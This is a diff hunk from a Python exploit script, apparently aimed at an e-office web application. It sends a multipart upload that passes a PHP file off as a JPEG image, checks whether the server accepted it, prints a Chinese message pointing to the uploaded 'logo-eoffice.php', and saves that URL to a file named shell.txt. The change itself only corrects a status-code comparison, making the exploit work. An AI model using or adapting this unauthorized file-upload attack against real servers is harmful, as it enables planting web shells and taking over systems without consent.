@@ -12,7 +12,7 @@ def run(target):
                "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"}
     data = "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n1\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n"
     res = requests.post(url, headers=headers,data=data)
-    if res.status_code == "200" and "logo-eoffice.php" in res.text:
+    if res.status_code == 200 and "logo-eoffice.php" in res.text:
         print(f"上传成功，请访问 {target}/images/logo/logo-eoffice.php")
         with open("shell.txt","w")as w:
             w.write(f"{target}/images/logo/logo-eoffice.php")
